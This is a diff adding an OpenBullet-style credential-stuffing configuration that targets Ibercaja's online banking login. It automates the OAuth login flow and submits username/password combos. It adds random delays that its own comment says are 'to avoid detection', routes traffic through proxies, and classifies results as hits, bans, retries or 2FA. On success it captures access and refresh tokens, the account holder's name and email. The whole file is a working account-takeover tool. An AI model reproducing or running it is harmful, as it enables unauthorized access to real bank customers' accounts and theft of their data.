@@ -1,0 +1,219 @@
+[SETTINGS]
+Name = Ibercaja Banca Digital Advanced
+Author = Security Researcher
+Version = 2.0
+ContinueOnCustom = False
+SaveHitsToTextFile = True
+
+[SCRIPT]
+
+# === FUNCIONES HELPER ===
+FUNCTION GenerateState
+  GENERATE GUID -> VAR "STATE"
+  FUNCTION Replace "<STATE>" "-" "" -> VAR "STATE"
+END
+
+FUNCTION GenerateNonce
+  GENERATE RANDOMNUM "1000000" "9999999" -> VAR "NONCE"
+  FUNCTION UnixTime -> VAR "TIMESTAMP"
+  SET VAR "NONCE" "<NONCE><TIMESTAMP>"
+END
+
+# === PASO 1: INICIALIZACIÓN ===
+FUNCTION GenerateState
+FUNCTION GenerateNonce
+
+# Headers base
+SET VAR "USER_AGENT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+
+REQUEST GET "https://sgv.ibercaja.es/auth/login" 
+  
+HEADER "User-Agent: <USER_AGENT>"
+HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
+HEADER "Accept-Language: es-ES,es;q=0.9,en;q=0.8"
+HEADER "Accept-Encoding: gzip, deflate, br"
+HEADER "DNT: 1"
+HEADER "Connection: keep-alive"
+HEADER "Upgrade-Insecure-Requests: 1"
+HEADER "Sec-Fetch-Dest: document"
+HEADER "Sec-Fetch-Mode: navigate"
+HEADER "Sec-Fetch-Site: none"
+HEADER "Sec-Fetch-User: ?1"
+
+# Capturar cookies iniciales
+PARSE "<HEADERS[Set-Cookie]>" LR "PHPSESSID=" ";" -> VAR "PHPSESSID"
+PARSE "<HEADERS[Set-Cookie]>" LR "incap_ses_" ";" -> VAR "INCAP_SESSION"
+PARSE "<HEADERS[Set-Cookie]>" LR "visid_incap_" ";" -> VAR "VISID_INCAP"
+
+# === PASO 2: AUTORIZACIÓN OAUTH ===
+REQUEST GET "https://identidad.ibercaja.es/soporte/plataforma/identidad/api/v1/connect/authorize" 
+  state: <STATE>
+  scope: iberfabric.omnicanalidad.canales.sgv.apigateway offline_access
+  response_type: code
+  approval_prompt: auto
+  redirect_uri: https://sgv.ibercaja.es/authenticated
+  client_id: EXT-SGV
+  bt: login
+  nonce: <NONCE>
+  
+HEADER "User-Agent: <USER_AGENT>"
+HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+HEADER "Accept-Language: es-ES,es;q=0.9"
+HEADER "Accept-Encoding: gzip, deflate, br"
+HEADER "Referer: https://sgv.ibercaja.es/"
+HEADER "Cookie: PHPSESSID=<PHPSESSID>; incap_ses_<INCAP_SESSION>; visid_incap_<VISID_INCAP>"
+
+# Capturar URL de login
+PARSE "<HEADERS[Location]>" FULL -> VAR "LOGIN_URL"
+
+# === PASO 3: OBTENER FORMULARIO DE LOGIN ===
+REQUEST GET "<LOGIN_URL>" 
+  
+HEADER "User-Agent: <USER_AGENT>"
+HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+HEADER "Accept-Language: es-ES,es;q=0.9"
+HEADER "Accept-Encoding: gzip, deflate, br"
+HEADER "Cookie: PHPSESSID=<PHPSESSID>"
+
+# Capturar todos los campos del formulario
+PARSE "<SOURCE>" LR "name=\"__RequestVerificationToken\" type=\"hidden\" value=\"" "\"" -> VAR "CSRF_TOKEN"
+PARSE "<SOURCE>" LR "name=\"Data\" type=\"hidden\" value=\"" "\"" -> VAR "DATA_TOKEN"
+PARSE "<SOURCE>" LR "name=\"ReturnUrl\" type=\"hidden\" value=\"" "\"" -> VAR "RETURN_URL"
+
+# Decodificar HTML entities en ReturnUrl
+FUNCTION HTMLDecode "<RETURN_URL>" -> VAR "RETURN_URL"
+
+# Capturar cookies de sesión de identidad
+PARSE "<HEADERS[Set-Cookie]>" LR "idsrv.session=" ";" -> VAR "IDSRV_SESSION"
+PARSE "<HEADERS[Set-Cookie]>" LR ".AspNetCore.Antiforgery." "=" -> VAR "ANTIFORGERY_NAME"
+PARSE "<HEADERS[Set-Cookie]>" LR "<ANTIFORGERY_NAME>=" ";" -> VAR "ANTIFORGERY_VALUE"
+
+# === PASO 4: ENVIAR CREDENCIALES ===
+# Delay aleatorio para evitar detección
+FUNCTION RandomNum "500" "2000" -> VAR "DELAY"
+FUNCTION Sleep "<DELAY>"
+
+REQUEST POST "https://identidad.ibercaja.es/soporte/plataforma/identidad/api/v1/Account/Login<RETURN_URL>" 
+  ReturnUrl: <RETURN_URL>
+  Data: <DATA_TOKEN>
+  Username: <USER>
+  Password: <PASS>
+  __RequestVerificationToken: <CSRF_TOKEN>
+  
+HEADER "User-Agent: <USER_AGENT>"
+HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+HEADER "Accept-Language: es-ES,es;q=0.9"
+HEADER "Accept-Encoding: gzip, deflate, br"
+HEADER "Content-Type: application/x-www-form-urlencoded"
+HEADER "Origin: https://identidad.ibercaja.es"
+HEADER "Referer: <LOGIN_URL>"
+HEADER "Cookie: PHPSESSID=<PHPSESSID>; idsrv.session=<IDSRV_SESSION>; <ANTIFORGERY_NAME>=<ANTIFORGERY_VALUE>"
+HEADER "DNT: 1"
+HEADER "Sec-Fetch-Dest: document"
+HEADER "Sec-Fetch-Mode: navigate"
+HEADER "Sec-Fetch-Site: same-origin"
+HEADER "Sec-Fetch-User: ?1"
+
+# === VERIFICACIÓN DE RESPUESTA ===
+KEYCHECK BanOnToCheck=FALSE
+  KEYCHAIN Ban OR
+    KEY "<SOURCE>" Contains "bloqueado"
+    KEY "<SOURCE>" Contains "blocked"
+    KEY "<SOURCE>" Contains "suspendido"
+    KEY "<SOURCE>" Contains "Too many failed"
+    
+  KEYCHAIN Retry OR
+    KEY "<RESPONSECODE>" EqualTo "429"
+    KEY "<RESPONSECODE>" EqualTo "503"
+    KEY "<SOURCE>" Contains "try again"
+    KEY "<SOURCE>" Contains "maintenance"
+    
+  KEYCHAIN Failure OR
+    KEY "<SOURCE>" Contains "Usuario o contraseña incorrectos"
+    KEY "<SOURCE>" Contains "Invalid username or password"
+    KEY "<SOURCE>" Contains "credenciales no válidas"
+    KEY "<SOURCE>" Contains "authentication failed"
+    KEY "<RESPONSECODE>" EqualTo "401"
+    KEY "<RESPONSECODE>" EqualTo "403"
+    
+  KEYCHAIN Success OR
+    KEY "<HEADERS[Location]>" Contains "code="
+    KEY "<RESPONSECODE>" EqualTo "302"
+    KEY "<SOURCE>" Contains "Redirigiendo"
+    KEY "<SOURCE>" Contains "authenticated"
+    
+  KEYCHAIN Custom OR
+    KEY "<SOURCE>" Contains "verificación adicional"
+    KEY "<SOURCE>" Contains "2FA"
+    KEY "<SOURCE>" Contains "código SMS"
+
+# === PASO 5: CAPTURA DE CÓDIGO DE AUTORIZACIÓN (SI HAY ÉXITO) ===
+#IF SUCCESS
+
+PARSE "<HEADERS[Location]>" LR "code=" "&" -> VAR "AUTH_CODE"
+PARSE "<HEADERS[Location]>" LR "state=" "&" -> VAR "AUTH_STATE"
+
+# === PASO 6: INTERCAMBIAR CÓDIGO POR TOKEN ===
+#IF "<AUTH_CODE>" != ""
+
+REQUEST POST "https://identidad.ibercaja.es/soporte/plataforma/identidad/api/v1/connect/token" 
+  grant_type: authorization_code
+  code: <AUTH_CODE>
+  redirect_uri: https://sgv.ibercaja.es/authenticated
+  client_id: EXT-SGV
+  client_secret: 
+  
+HEADER "User-Agent: <USER_AGENT>"
+HEADER "Accept: application/json"
+HEADER "Content-Type: application/x-www-form-urlencoded"
+HEADER "Origin: https://sgv.ibercaja.es"
+HEADER "Referer: https://sgv.ibercaja.es/"
+
+# Capturar tokens
+PARSE "<SOURCE>" JSON "access_token" -> VAR "ACCESS_TOKEN"
+PARSE "<SOURCE>" JSON "refresh_token" -> VAR "REFRESH_TOKEN"
+PARSE "<SOURCE>" JSON "id_token" -> VAR "ID_TOKEN"
+PARSE "<SOURCE>" JSON "expires_in" -> VAR "EXPIRES_IN"
+
+# === PASO 7: OBTENER INFORMACIÓN DEL USUARIO ===
+#IF "<ACCESS_TOKEN>" != ""
+
+REQUEST GET "https://identidad.ibercaja.es/soporte/plataforma/identidad/api/v1/connect/userinfo" 
+  
+HEADER "User-Agent: <USER_AGENT>"
+HEADER "Accept: application/json"
+HEADER "Authorization: Bearer <ACCESS_TOKEN>"
+
+# Capturar información del usuario
+PARSE "<SOURCE>" JSON "sub" -> VAR "USER_ID"
+PARSE "<SOURCE>" JSON "name" -> VAR "FULL_NAME"
+PARSE "<SOURCE>" JSON "given_name" -> VAR "FIRST_NAME"
+PARSE "<SOURCE>" JSON "family_name" -> VAR "LAST_NAME"
+PARSE "<SOURCE>" JSON "email" -> VAR "EMAIL"
+
+#ENDIF
+#ENDIF
+#ENDIF
+
+# === CAPTURA FINAL ===
+#IF SUCCESS
+CAPTURE ACCESS_TOKEN
+CAPTURE REFRESH_TOKEN
+CAPTURE USER_ID
+CAPTURE FULL_NAME
+CAPTURE EMAIL
+#ENDIF
+
+[SETTINGS]
+RunOnCapture = True
+IgnoreResponseErrors = False
+MaxRedirects = 0
+ReadResponseSource = True
+EncodeData = True
+AcceptEncoding = gzip, deflate, br
+AllowAutoRedirect = False
+EnableCookies = True
+UseSocks = False
+UseProxy = True
+ProxyType = HTTP
+ContinueOnCustom = True
